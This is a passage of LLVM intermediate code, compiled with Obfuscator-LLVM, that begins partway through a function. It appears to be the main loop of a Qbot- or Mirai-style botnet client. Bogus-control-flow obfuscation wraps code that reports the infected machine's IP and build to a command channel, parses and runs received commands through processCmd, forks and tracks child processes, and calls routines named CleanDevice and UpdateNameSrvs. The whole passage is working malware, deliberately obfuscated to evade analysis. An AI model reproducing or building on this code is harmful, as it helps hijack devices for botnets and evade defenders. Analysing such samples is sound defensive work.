originalBB94:                                     ; preds = %originalBB94alteredBB, %653
  %662 = load i32, i32* %24, align 4
  %663 = add nsw i32 %662, 1
  store i32 %663, i32* %24, align 4
  %664 = load i32, i32* @x.111
  %665 = load i32, i32* @y.112
  %666 = sub i32 %664, 1
  %667 = mul i32 %664, %666
  %668 = urem i32 %667, 2
  %669 = icmp eq i32 %668, 0
  %670 = icmp slt i32 %665, 10
  %671 = or i1 %669, %670
  br i1 %671, label %originalBBpart2103, label %originalBB94alteredBB

originalBBpart2103:                               ; preds = %originalBB94
  br label %644

; <label>:672:                                    ; preds = %644
  br label %673

; <label>:673:                                    ; preds = %672, %originalBBpart292
  %674 = load i32, i32* @x.111
  %675 = load i32, i32* @y.112
  %676 = sub i32 %674, 1
  %677 = mul i32 %674, %676
  %678 = urem i32 %677, 2
  %679 = icmp eq i32 %678, 0
  %680 = icmp slt i32 %675, 10
  %681 = or i1 %679, %680
  br i1 %681, label %originalBB105, label %originalBB105alteredBB

originalBB105:                                    ; preds = %originalBB105alteredBB, %673
  %682 = load i32, i32* @x.111
  %683 = load i32, i32* @y.112
  %684 = sub i32 %682, 1
  %685 = mul i32 %682, %684
  %686 = urem i32 %685, 2
  %687 = icmp eq i32 %686, 0
  %688 = icmp slt i32 %683, 10
  %689 = or i1 %687, %688
  br i1 %689, label %originalBBpart2107, label %originalBB105alteredBB

originalBBpart2107:                               ; preds = %originalBB105
  br label %690

; <label>:690:                                    ; preds = %originalBBpart2107, %originalBBpart256
  br label %176

; <label>:691:                                    ; preds = %176
  br label %148
                                                  ; No predecessors!
  %693 = load i32, i32* %3, align 4
  ret i32 %693

originalBBalteredBB:                              ; preds = %originalBB, %65
  %694 = load i32, i32* %9, align 4
  %695 = icmp ne i32 %694, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %84
  %696 = call i32 @fork() #3
  store i32 %696, i32* %10, align 4
  %697 = icmp ne i32 %696, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %103
  call void @exit(i32 0) #11
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %127
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %152
  %698 = load i32, i32* @KadenCommStock, align 4
  %699 = call i8* @getBuild()
  %700 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %701 = call i8* @inet_ntoa(i32 %700) #3
  %702 = call i32 @getEndianness()
  %703 = call i8* @getBuildz()
  %704 = call i32 (i32, i8*, ...) @botnetPrint(i32 %698, i8* getelementptr inbounds ([134 x i8], [134 x i8]* @.str.146, i32 0, i32 0), i8* %699, i8* %701, i32 %702, i8* %703)
  call void @CleanDevice()
  call void @UpdateNameSrvs()
  store i32 0, i32* %13, align 4
  store i32 0, i32* %14, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %181
  store i32 0, i32* %14, align 4
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %211
  %705 = load i32, i32* %14, align 4
  %_ = sub i32 %705, 1
  %gen = mul i32 %_, 1
  %706 = add nsw i32 %705, 1
  store i32 %706, i32* %16, align 4
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %235
  %707 = load i32*, i32** @pids, align 8
  %708 = load i32, i32* %16, align 4
  %709 = zext i32 %708 to i64
  %710 = getelementptr inbounds i32, i32* %707, i64 %709
  %711 = load i32, i32* %710, align 4
  %712 = load i32*, i32** @pids, align 8
  %713 = load i32, i32* %16, align 4
  %_27 = shl i32 %713, 1
  %_28 = sub i32 %713, 1
  %gen29 = mul i32 %_28, 1
  %714 = sub i32 %713, 1
  %715 = zext i32 %714 to i64
  %716 = getelementptr inbounds i32, i32* %712, i64 %715
  store i32 %711, i32* %716, align 4
  br label %originalBB26

originalBB33alteredBB:                            ; preds = %originalBB33, %293
  %717 = load i32, i32* %16, align 4
  %_34 = sub i32 0, %717
  %gen35 = add i32 %_34, 1
  %_36 = sub i32 %717, 1
  %gen37 = mul i32 %_36, 1
  %_38 = shl i32 %717, 1
  %_39 = sub i32 0, %717
  %gen40 = add i32 %_39, 1
  %718 = add i32 %717, 1
  store i32 %718, i32* %16, align 4
  br label %originalBB33

originalBB44alteredBB:                            ; preds = %originalBB44, %317
  %719 = load i32, i32* %14, align 4
  %_45 = sub i32 0, %719
  %gen46 = add i32 %_45, 1
  %_47 = sub i32 %719, 1
  %gen48 = mul i32 %_47, 1
  %_49 = shl i32 %719, 1
  %_50 = shl i32 %719, 1
  %720 = add nsw i32 %719, 1
  store i32 %720, i32* %14, align 4
  br label %originalBB44

originalBB54alteredBB:                            ; preds = %originalBB54, %336
  %721 = load i32, i32* %13, align 4
  %722 = sext i32 %721 to i64
  %723 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i64 0, i64 %722
  store i8 0, i8* %723, align 1
  %724 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i32 0, i32 0
  call void @trim(i8* %724)
  %725 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i32 0, i32 0
  store i8* %725, i8** %17, align 8
  %726 = load i8*, i8** %17, align 8
  %727 = load i8, i8* %726, align 1
  %728 = zext i8 %727 to i32
  %729 = icmp eq i32 %728, 33
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %362
  %730 = load i8*, i8** %17, align 8
  %731 = getelementptr inbounds i8, i8* %730, i64 1
  store i8* %731, i8** %18, align 8
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %381
  %732 = load i8*, i8** %18, align 8
  %733 = load i8, i8* %732, align 1
  %734 = zext i8 %733 to i32
  %735 = icmp ne i32 %734, 32
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %409
  %736 = load i8*, i8** %18, align 8
  %737 = getelementptr inbounds i8, i8* %736, i32 1
  store i8* %737, i8** %18, align 8
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %434
  %738 = load i8*, i8** %18, align 8
  store i8 0, i8* %738, align 1
  %739 = load i8*, i8** %17, align 8
  %740 = getelementptr inbounds i8, i8* %739, i64 1
  store i8* %740, i8** %18, align 8
  %741 = load i8*, i8** %17, align 8
  %742 = load i8*, i8** %18, align 8
  %743 = call i64 @strlen(i8* %742) #9
  %744 = getelementptr inbounds i8, i8* %741, i64 %743
  %745 = getelementptr inbounds i8, i8* %744, i64 2
  store i8* %745, i8** %17, align 8
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %485
  %746 = load i8*, i8** %17, align 8
  store i8* %746, i8** %19, align 8
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %508
  %747 = load i8*, i8** %17, align 8
  %748 = load i8, i8* %747, align 1
  %749 = zext i8 %748 to i32
  %750 = icmp ne i32 %749, 0
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %529
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %559
  %751 = load i8*, i8** %20, align 8
  %752 = load i8, i8* %751, align 1
  %753 = zext i8 %752 to i32
  %754 = call i32 @toupper(i32 %753) #9
  %755 = trunc i32 %754 to i8
  %756 = load i8*, i8** %20, align 8
  store i8 %755, i8* %756, align 1
  %757 = load i8*, i8** %20, align 8
  %758 = getelementptr inbounds i8, i8* %757, i32 1
  store i8* %758, i8** %20, align 8
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %622
  %759 = load i32, i32* %22, align 4
  %760 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i32 0, i32 0
  call void @processCmd(i32 %759, i8** %760)
  %761 = load i32, i32* %22, align 4
  %762 = icmp sgt i32 %761, 1
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %653
  %763 = load i32, i32* %24, align 4
  %_95 = sub i32 0, %763
  %gen96 = add i32 %_95, 1
  %_97 = sub i32 %763, 1
  %gen98 = mul i32 %_97, 1
  %_99 = sub i32 %763, 1
  %gen100 = mul i32 %_99, 1
  %_101 = shl i32 %763, 1
  %764 = add nsw i32 %763, 1
  store i32 %764, i32* %24, align 4
  br label %originalBB94

originalBB105alteredBB:                           ; preds = %originalBB105, %673
  br label %originalBB105
}

; Function Attrs: nounwind
declare i32 @unlink(i8*) #1

; Function Attrs: nounwind
declare i32 @prctl(i32, ...) #1

declare i32 @waitpid(i32, i32*, i32) #2

; Function Attrs: nounwind
declare i32 @chdir(i8*) #1

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #1

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #5

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind }
attributes #4 = { argmemonly nounwind }
attributes #5 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readonly }
attributes #10 = { nounwind readnone }
attributes #11 = { noreturn nounwind }
attributes #12 = { noreturn }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146536828}
!2 = !{i32 -2146536137}
!3 = !{i32 -2146535388}
!4 = !{i32 -2146534678}
!5 = !{i32 -2146533860}
!6 = !{i32 -2146532969}
